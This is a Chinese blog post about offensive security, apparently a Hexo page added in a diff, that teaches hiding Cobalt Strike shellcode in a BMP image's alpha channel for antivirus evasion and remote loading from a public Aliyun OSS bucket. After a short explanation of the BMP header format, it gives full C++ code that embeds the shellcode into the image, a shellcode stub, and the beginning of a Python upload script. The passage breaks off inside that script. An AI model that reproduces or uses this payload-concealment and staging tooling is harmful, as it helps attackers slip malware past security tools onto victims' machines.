@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用图片隐写术远程动态加载shellcode">
+<meta property="og:url" content="https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/index.html">
+<meta property="og:site_name" content="c1y2m3&#39;s blog">
+<meta property="og:description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1598344206573-cb56e0e6-513a-480c-85ee-e8228489c009.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597633326594-c31c43a6-c297-4cbb-b517-31747abb6df9.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286887029-1b31201c-ecdc-4cc0-b80b-641ca70f457e.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286949252-38c935a2-1ea6-484d-9f13-1b40e55ad670.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286970287-c9426c02-f5e5-494b-a463-4be9eea9cfb8.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286914815-2665d6c2-69c4-40f4-9139-cc9580b1e61c.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286872411-7930443a-697a-435d-8ba7-f30f2731804d.gif">
+<meta property="article:published_time" content="2020-08-24T03:51:24.000Z">
+<meta property="article:modified_time" content="2023-02-01T11:48:33.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1598344206573-cb56e0e6-513a-480c-85ee-e8228489c009.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>利用图片隐写术远程动态加载shellcode</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/08/01/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E5%B8%B8%E8%A7%84%E9%82%AE%E7%AE%B1%E9%AA%8C%E8%AF%81%E5%AD%98%E6%B4%BB/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&text=利用图片隐写术远程动态加载shellcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&is_video=false&description=利用图片隐写术远程动态加载shellcode"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用图片隐写术远程动态加载shellcode&body=Check out this article: https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&title=利用图片隐写术远程动态加载shellcode"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&name=利用图片隐写术远程动态加载shellcode&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/&t=利用图片隐写术远程动态加载shellcode"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">0x02 相关概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 程序实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9B%BE%E7%89%87%E7%94%9F%E6%88%90"><span class="toc-number">3.1.</span> <span class="toc-text">一、图片生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.2.</span> <span class="toc-text">二、文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.3.</span> <span class="toc-text">三、远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.4.</span> <span class="toc-text">自动化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用图片隐写术远程动态加载shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-24T03:51:24.000Z" itemprop="datePublished">2020-08-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>将Shellcode隐写到正常BMP图片中，把字符串拆成字节，写入每个像素的alpha通道中，然后上传到可信任的网站下偏移拼接shellcode进行远程动态加载，能有效地增加了免杀性和隐匿性。</p>
+<h3 id="0x02-相关概念"><a href="#0x02-相关概念" class="headerlink" title="0x02 相关概念"></a>0x02 相关概念</h3><p>BMP文件的数据按照从文件头开始的先后顺序分为四个部分：</p>
+<ul>
+<li>**bmp文件头(bmp file header)**：提供文件的格式、大小等信息</li>
+<li>**位图信息头(bitmap information)**：提供图像数据的尺寸、位平面数、压缩方式、颜色索引等信息</li>
+<li>**调色板(color palette)**：可选，如使用索引来表示图像，调色板就是索引与其对应的颜色的映射表</li>
+<li>位图数据(bitmap data)：就是图像数据</li>
+</ul>
+<p>下面结合Windows结构体的定义，通过一个表来分析这四个部分。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1598344206573-cb56e0e6-513a-480c-85ee-e8228489c009.png" alt="img"></p>
+<p>这里已经有先人分析了，引用参考</p>
+<p>打开010 Editor 然后把文件拖入分析</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597633326594-c31c43a6-c297-4cbb-b517-31747abb6df9.png" alt="img"></p>
+<p>一、bmp文件头</p>
+<p>其中最关键的两个结构体BITMAPFILEHEADER和BITMAPINFOHEADER，这里面保存了这个Bmp文件的很多信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagBITMAPFILEHEADER </span><br><span class="line">&#123;  </span><br><span class="line">UINT16 bfType;    // 说明位图类型  2字节</span><br><span class="line">DWORD bfSize;  // 说明位图大小  4字节</span><br><span class="line">UINT16 bfReserved1;  // 保留字，必须为0  2字节</span><br><span class="line">UINT16 bfReserved2;  // 保留字，必须为0   2字节</span><br><span class="line">DWORD bfOffBits; // 从文件头到实际的图像数据的偏移量是多少  4字节</span><br><span class="line">&#125; BITMAPFILEHEADER;  //一共16个字节</span><br></pre></td></tr></table></figure>
+
+<p>1.最开头的两个十六进制为42H，4DH转为ASCII后分别表示BM，所有的BMP文件都以这两个字节开头。</p>
+<p>2.红色箭头是图片的大小（这里对应的十六进制为26 3D 17 00，但这设计大小端转化，所以他一个转为00 17 3D 26，换成十进制就为1522982）。</p>
+<p>3.黄色的那两个箭头一般填充为0。</p>
+<p>4.橘色监听的bfOffBits是从BMP文件的第一个字节开始，到第54个字节就是像素的开始。</p>
+<p>二、位图信息头(bitmap-informationheader)</p>
+<p>同样，Windows为位图信息头定义了如下结构体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagBITMAPINFOHEADER</span><br><span class="line"> &#123;</span><br><span class="line">DWORD biSize;  // 说明该结构一共需要的字节数 2字节</span><br><span class="line">LONG biWidth;  // 说明图片的宽度，以像素为单位 4字节</span><br><span class="line">LONG biHeight; // 说明图片的高度，以像素为单位 4字节</span><br><span class="line">WORD biPlanes; //颜色板，总是设为1  2个字节</span><br><span class="line">WORD biBitCount;  //说明每个比特占多少bit位，可以通过这个字段知道图片类型  2个字节</span><br><span class="line">DWORD biCompression;  // 说明使用的压缩算法 2个字节 （BMP无压缩算法）</span><br><span class="line">DWORD biSizeImage;  //说明图像大小   2个字节</span><br><span class="line">LONG biXPelsPerMeter;  //水平分辨率 4字节  单位：像素/米</span><br><span class="line">LONG biYPelsPerMeter;  //垂直分辨率4字节</span><br><span class="line">DWORD biClrUsed;  //说明位图使用的颜色索引数 4字节</span><br><span class="line">DWORD biClrImportant; //4字节</span><br><span class="line">&#125; BITMAPINFOHEADER; // 一共40个字节</span><br></pre></td></tr></table></figure>
+
+<p>5.biSze是指这个struct BITMAPINDOHEADER bmih占40个字节大小。</p>
+<p>6.biWidth,和biHeight指图片的宽和高</p>
+<p>6.黑色箭头bitBitCount代表：BGRA 蓝、绿、红、alpha，来存储一个像素，蓝占多少，绿占多少，红占多少，alpha是透明度，这个字节的数值表示的是该像素点的透明度：数值为0时，该像素点完全透明，利用这种特性来藏数据了，而不影响原图片的正常显示。</p>
+<p>7.这两个结构体结束后：剩下的部分就是像素的BGRA了。</p>
+<hr>
+<h3 id="0x03-程序实现"><a href="#0x03-程序实现" class="headerlink" title="0x03 程序实现"></a>0x03 程序实现</h3><p>现在这个程序的思路就是：</p>
+<p>1.用C&#x2F;C++代码读取图片文件里面的这两个结构体。</p>
+<p>2.读取图片到内存中。获取bfOffBIts，再获取alpha通道（+4）。</p>
+<p>3.把数据拆分，插入到alpha通道，保存文件上传到阿里云对象存储OSS或可信任网站上。</p>
+<p>4.远程读取被修改图片的alpha通道，拼接组合shellcode申请内存加载。</p>
+<h4 id="一、图片生成"><a href="#一、图片生成" class="headerlink" title="一、图片生成"></a>一、图片生成</h4><p>为了方便隐藏写入，将CS生成的shellcode转换成hex编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code = &quot;\xfc\xe8\x89\x00\x00\x00\x60\x56\x78.........&quot;</span><br><span class="line">print(code.encode(&#x27;hex&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>核心代码参考 <a target="_blank" rel="noopener" href="https://github.com/loyalty-fox/idshwk7">https://github.com/loyalty-fox/idshwk7</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">//dwBmpSize.cpp</span><br><span class="line">#include &quot;dwBmpSize.h&quot;</span><br><span class="line"> </span><br><span class="line">CBMPHide::CBMPHide()</span><br><span class="line">&#123;</span><br><span class="line">	sBmpFileName = &quot;&quot;;</span><br><span class="line">	pBuf = 0;</span><br><span class="line">	dwBmpSize = 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">CBMPHide::~CBMPHide()</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">bool CBMPHide::setBmpFileName(char* szFileName)</span><br><span class="line">&#123;</span><br><span class="line">	this-&gt;sBmpFileName = szFileName;</span><br><span class="line">	if (pBuf)	//如果已经生成就释放掉</span><br><span class="line">	&#123;</span><br><span class="line">		delete[]pBuf;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);</span><br><span class="line">	if (hfile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	//和struct BITMAPFILEHEADER bmfh里面的 bfSize的大小应该是一样的。</span><br><span class="line">	dwBmpSize = GetFileSize(hfile, 0);	//获取文件的大小</span><br><span class="line">	pBuf = new byte[dwBmpSize];</span><br><span class="line">	DWORD dwRead = 0;</span><br><span class="line">	ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0);</span><br><span class="line">	if (dwRead != dwBmpSize)</span><br><span class="line">	&#123;</span><br><span class="line">		delete[]pBuf;</span><br><span class="line">		pBuf = 0;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hfile);</span><br><span class="line">	m_fileHdr = (BITMAPFILEHEADER*)pBuf;</span><br><span class="line">	m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER));</span><br><span class="line">	return true;	//成功话就是文件的内容读取到pBuf里面</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">int CBMPHide::getBmpWidth()</span><br><span class="line">&#123;</span><br><span class="line">	return m_infoHdr-&gt;biWidth;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int CBMPHide::getBmpHeight()</span><br><span class="line">&#123;</span><br><span class="line">	return m_infoHdr-&gt;biHeight;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int CBMPHide::getBmpBitCount()</span><br><span class="line">&#123;</span><br><span class="line">	return m_infoHdr-&gt;biBitCount;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">bool CBMPHide::save()</span><br><span class="line">&#123;</span><br><span class="line">	string sDstFileName = &quot;save.bmp&quot;;</span><br><span class="line">    HANDLE hfile = CreateFileA(sDstFileName.c_str(),</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">		NULL,</span><br><span class="line">		CREATE_ALWAYS, 0, 0);</span><br><span class="line">	if (hfile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	DWORD dwWritten = 0;</span><br><span class="line">	WriteFile(hfile, pBuf, dwBmpSize, &amp;dwWritten, 0);</span><br><span class="line">	if (dwBmpSize != dwWritten)</span><br><span class="line">	&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hfile);</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line">//隐藏一个字符串到图片中，把字符串拆成字节，写入每个像素的alpha通道中</span><br><span class="line">bool CBMPHide::hideString2BMP(char* szStr2Hide)</span><br><span class="line">&#123;</span><br><span class="line">	LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3;	//第一个像素的通道位置</span><br><span class="line">	int nHide;	//成功隐藏的字节数</span><br><span class="line"> </span><br><span class="line">	//每次循环写入一个字节，吸入alpha通道</span><br><span class="line">	//(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize这个是判断字符串是太大，图片不能隐藏</span><br><span class="line">	for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4)</span><br><span class="line">	&#123;</span><br><span class="line">		*pAlpha = szStr2Hide[nHide];	//写入一个字节</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line">//main.cpp</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	if (argc &lt; 2)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\n&quot;, argv[0]);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CBMPHide hide;</span><br><span class="line">	hide.setBmpFileName((char*)&quot;test.bmp&quot;);</span><br><span class="line">	printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\n&quot;,</span><br><span class="line">		hide.getBmpWidth(),</span><br><span class="line">		hide.getBmpHeight(),</span><br><span class="line">		hide.getBmpBitCount());</span><br><span class="line">	char * shellcode = argv[1];</span><br><span class="line">	hide.hideString2BMP((char*)shellcode);</span><br><span class="line">	hide.save();</span><br><span class="line">	cout &lt;&lt; shellcode &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286887029-1b31201c-ecdc-4cc0-b80b-641ca70f457e.png" alt="img"></p>
+<h4 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h4><p>进入阿里云控制台点击对象存储OSS，创建 Bucket，将读写权限改为公共读。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286949252-38c935a2-1ea6-484d-9f13-1b40e55ad670.png" alt="img"></p>
+<p>然后申请AccessKey创建成功将获取到AccessKeyID和AccessKeySecret。</p>
+<p><a target="_blank" rel="noopener" href="https://usercenter.console.aliyun.com/#/manage/ak">https://usercenter.console.aliyun.com/#/manage/ak</a></p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597286970287-c9426c02-f5e5-494b-a463-4be9eea9cfb8.png" alt="img"></p>
+<p>使用aliyunSDK中的put_object_from_file方法上传单个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import oss2</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">class OSS2():</span><br><span class="line">    def __init__(self, accesskeyid, accesskeysecret, endpoint, bucket,</span><br><span class="line">                 filename):</span><br><span class="line">        self.accessid = accesskeyid </span><br><span class="line">        self.accesskey = accesskeysecret</span><br><span class="line">        self.endpoint = endpoint  #OSS服务在各个区域的域名地址</span><br><span class="line">        self.bucketstring = bucket #创建容器的名称</span><br><span class="line">        self.filename = filename  # 上传的文件名</span><br><span 